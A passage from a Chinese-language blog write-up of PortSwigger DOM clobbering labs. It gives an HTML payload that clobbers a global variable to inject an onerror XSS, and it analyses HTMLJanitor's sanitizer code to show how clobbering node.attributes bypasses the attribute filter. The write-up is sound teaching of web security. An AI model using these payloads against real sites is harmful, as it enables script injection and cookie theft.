</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>defaultAvatar</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>defaultAvatar</span> <span class=o>||</span> <span class=p>{</span><span class=nx>avatar</span><span class=o>:</span> <span class=s1>&#39;/resources/images/avatarDefault.svg&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>avatarImgHTML</span> <span class=o>=</span> <span class=s1>&#39;&lt;img class=&#34;avatar&#34; src=&#34;&#39;</span> <span class=o>+</span> <span class=p>(</span><span class=nx>comment</span><span class=p>.</span><span class=nx>avatar</span> <span class=o>?</span> <span class=nx>escapeHTML</span><span class=p>(</span><span class=nx>comment</span><span class=p>.</span><span class=nx>avatar</span><span class=p>)</span> <span class=o>:</span> <span class=nx>defaultAvatar</span><span class=p>.</span><span class=nx>avatar</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;&#34;&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>divImgContainer</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>divImgContainer</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>avatarImgHTML</span>
</span></span></code></pre></td></tr></table></div></div><p>这里很明显我们可以用 Dom Clobbering 来控制 <code>window.defaultAvatar</code>，只要我们原来没有头像就可以用一个构造一个<code>defaultAvatar.avatar</code>进行 XSS 了。</p><p>根据前面的知识，这是一个两层的层级关系，我们可以用 HTMLCollection 来操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>defaultAvatar</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>defaultAvatar</span> <span class=na>name</span><span class=o>=</span><span class=s>avatar</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;1:&amp;quot;onerror=alert(1)//&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里注意<code>"</code>需要进行 HTML实体编码，用 URL 编码的话浏览器会报错<code>1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND</code>。</p><p>这样评论以后我们可以在自己的评论处看到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;defaultAvatar&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;1:&amp;quot;onerror=alert(1)//&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;avatar&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;defaultAvatar&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>我们再随便评论一下就好了，就可以触发我们构造的 XSS 了。</p><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png loading=lazy></p><h3 id=labclobbering-dom-attributes-to-bypass-html-filters>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>​ This lab uses the HTMLJanitor library, which is vulnerable to <a class=link href=https://portswigger.net/web-security/dom-based/dom-clobbering target=_blank rel=noopener>DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim&rsquo;s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>这个题目也比较有意思，在<code>resources/js/loadCommentsWithHtmlJanitor.js</code>文件中，我们可以发现代码安全多了，没有明显的直接用<code>Window.x</code>这种代码了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>janitor</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>HTMLJanitor</span><span class=p>({</span><span class=nx>tags</span><span class=o>:</span> <span class=p>{</span><span class=nx>input</span><span class=o>:</span><span class=p>{</span><span class=nx>name</span><span class=o>:</span><span class=kc>true</span><span class=p>,</span><span class=nx>type</span><span class=o>:</span><span class=kc>true</span><span class=p>,</span><span class=nx>value</span><span class=o>:</span><span class=kc>true</span><span class=p>},</span><span class=nx>form</span><span class=o>:</span><span class=p>{</span><span class=nx>id</span><span class=o>:</span><span class=kc>true</span><span class=p>},</span><span class=nx>i</span><span class=o>:</span><span class=p>{},</span><span class=nx>b</span><span class=o>:</span><span class=p>{},</span><span class=nx>p</span><span class=o>:</span><span class=p>{}}});</span>
</span></span></code></pre></td></tr></table></div></div><p>一开始就初始化了<code>HTMLJanitor</code>，只能使用初始化内的标签及其属性，对于重要的输入输出地方都使用了<code>janitor.clean</code>进行过滤。看起来我们没办法很简单地进行 XSS ，那我们就只能来看看<code>resources/js/htmlJanitor.js</code>这个过滤文件了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>HTMLJanitor</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>clean</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>html</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>sandbox</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>implementation</span><span class=p>.</span><span class=nx>createHTMLDocument</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>root</span> <span class=o>=</span> <span class=nx>sandbox</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>root</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>html</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>this</span><span class=p>.</span><span class=nx>_sanitize</span><span class=p>(</span><span class=nx>sandbox</span><span class=p>,</span> <span class=nx>root</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>root</span><span class=p>.</span><span class=nx>innerHTML</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>首先用<code>document.implementation.createHTMLDocument</code>创建了一个新的 HTML 文档用作 sandbox ，然后对于 sandbox 内的元素进行<code>_sanitize</code>过滤。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>HTMLJanitor</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>_sanitize</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nb>document</span><span class=p>,</span> <span class=nx>parentNode</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kd>var</span> <span class=nx>treeWalker</span> <span class=o>=</span> <span class=nx>createTreeWalker</span><span class=p>(</span><span class=nb>document</span><span class=p>,</span> <span class=nx>parentNode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在<code>_sanitize</code>函数一开始调用了<code>createTreeWalker</code>函数创建一个<code>TreeWalker</code>，这个类表示一个当前文档的子树中的所有节点及其位置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>createTreeWalker</span><span class=p>(</span><span class=nb>document</span><span class=p>,</span> <span class=nx>node</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createTreeWalker</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nx>node</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>NodeFilter</span><span class=p>.</span><span class=nx>SHOW_TEXT</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=nx>NodeFilter</span><span class=p>.</span><span class=nx>SHOW_ELEMENT</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=nx>NodeFilter</span><span class=p>.</span><span class=nx>SHOW_COMMENT</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=kc>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=kc>false</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里的<code>node</code>即为一开始的<code>root</code>，也就是我们构造的<code>html</code>会在传入到<code>node</code>参数，<code>document</code>即为一开始的<code>sandbox</code>，接着进入循环进行判断，对于文本呢绒以及注释进行处理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>nodeType</span> <span class=o>===</span> <span class=nx>Node</span><span class=p>.</span><span class=nx>TEXT_NODE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>//如果此文本节点只是空白，并且上一个或下一个元素同级是`blockElement`，则将其删除
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// 移除所有的注释
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>nodeType</span> <span class=o>===</span> <span class=nx>Node</span><span class=p>.</span><span class=nx>COMMENT_NODE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>//检查`inlineElement`中是否还有`BlockElement`
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>isInline</span> <span class=o>=</span> <span class=nx>isInlineElement</span><span class=p>(</span><span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>containsBlockElement</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isInline</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>containsBlockElement</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>some</span><span class=p>.</span><span class=nx>call</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nx>node</span><span class=p>.</span><span class=nx>childNodes</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>isBlockElement</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>//检查`BlockElement`是否嵌套
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>isNotTopContainer</span> <span class=o>=</span> <span class=o>!!</span><span class=nx>parentNode</span><span class=p>.</span><span class=nx>parentNode</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>isNestedBlockElement</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>    <span class=nx>isBlockElement</span><span class=p>(</span><span class=nx>parentNode</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=nx>isBlockElement</span><span class=p>(</span><span class=nx>node</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=nx>isNotTopContainer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>nodeName</span> <span class=o>=</span> <span class=nx>node</span><span class=p>.</span><span class=nx>nodeName</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>//获取允许使用的属性
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>allowedAttrs</span> <span class=o>=</span> <span class=nx>getAllowedAttrs</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>config</span><span class=p>,</span> <span class=nx>nodeName</span><span class=p>,</span> <span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>isInvalid</span> <span class=o>=</span> <span class=nx>isInline</span> <span class=o>&amp;&amp;</span> <span class=nx>containsBlockElement</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//根据白名单删除标签
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>  <span class=nx>isInvalid</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=nx>shouldRejectNode</span><span class=p>(</span><span class=nx>node</span><span class=p>,</span> <span class=nx>allowedAttrs</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=o>!</span><span class=k>this</span><span class=p>.</span><span class=nx>config</span><span class=p>.</span><span class=nx>keepNestedBlockElements</span> <span class=o>&amp;&amp;</span> <span class=nx>isNestedBlockElement</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Do not keep the inner text of SCRIPT/STYLE elements.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=o>!</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>nodeName</span> <span class=o>===</span> <span class=s2>&#34;SCRIPT&#34;</span> <span class=o>||</span> <span class=nx>node</span><span class=p>.</span><span class=nx>nodeName</span> <span class=o>===</span> <span class=s2>&#34;STYLE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>childNodes</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>parentNode</span><span class=p>.</span><span class=nx>insertBefore</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>childNodes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>parentNode</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>this</span><span class=p>.</span><span class=nx>_sanitize</span><span class=p>(</span><span class=nb>document</span><span class=p>,</span> <span class=nx>parentNode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>最后看到值得我们关注的点：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Sanitize attributes
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>a</span> <span class=o>&lt;</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>a</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>attr</span> <span class=o>=</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>[</span><span class=nx>a</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>shouldRejectAttr</span><span class=p>(</span><span class=nx>attr</span><span class=p>,</span> <span class=nx>allowedAttrs</span><span class=p>,</span> <span class=nx>node</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>node</span><span class=p>.</span><span class=nx>removeAttribute</span><span class=p>(</span><span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Shift the array to continue looping.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>a</span> <span class=o>=</span> <span class=nx>a</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Sanitize children
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>this</span><span class=p>.</span><span class=nx>_sanitize</span><span class=p>(</span><span class=nb>document</span><span class=p>,</span> <span class=nx>node</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>在这里最终对标签的属性进行了 check ，对 node 的每个属性都进行了白名单检查</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>shouldRejectAttr</span><span class=p>(</span><span class=nx>attr</span><span class=p>,</span> <span class=nx>allowedAttrs</span><span class=p>,</span> <span class=nx>node</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>attrName</span> <span class=o>=</span> <span class=nx>attr</span><span class=p>.</span><span class=nx>name</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>allowedAttrs</span> <span class=o>===</span> <span class=kc>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;function&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>!</span><span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>](</span><span class=nx>attr</span><span class=p>.</span><span class=nx>value</span><span class=p>,</span> <span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;undefined&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>]</span> <span class=o>===</span> <span class=kc>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;string&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>allowedAttrs</span><span class=p>[</span><span class=nx>attrName</span><span class=p>]</span> <span class=o>!==</span> <span class=nx>attr</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>如果发现有不在白名单的属性，会使用<code>node.removeAttribute(attr.name);</code>进行删除，然后对子节点进行递归<code>_sanitize</code>。所以有两个思路，要么绕标签过滤，要么绕节点属性过滤。</p><p>标签的获取由<code>treeWalker.firstChild();</code>得到，过滤由<code>getAllowedAttrs</code>以及<code>shouldRejectNode</code>两个函数进行，由于这里的过滤是进行白名单过滤，没什么办法进行绕过；属性的获取在一个<code>for</code>循环当中，条件是<code>node.attributes.length</code>，获取方式是<code>node.attributes[a]</code>，过滤由<code>shouldRejectAttr</code>方法进行。</p><p>对 Dom Clobbering 比较敏感的同学可能会注意到这里，对于 node 属性过滤时的<code>for</code>循环条件，直接使用了<code>node.attributes.length</code>，倘若我们构造的节点正好有一个<code>attributes</code>子节点会怎么样呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>node</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>a</span> <span class=o>&lt;</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>a</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>[</span><span class=nx>a</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;finished&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>以上这段代码会输出一个<code>NamedNodeMap</code>对象，<code>id='x'</code>以及 finished</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span> <span class=na>name</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>node</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>);</span>
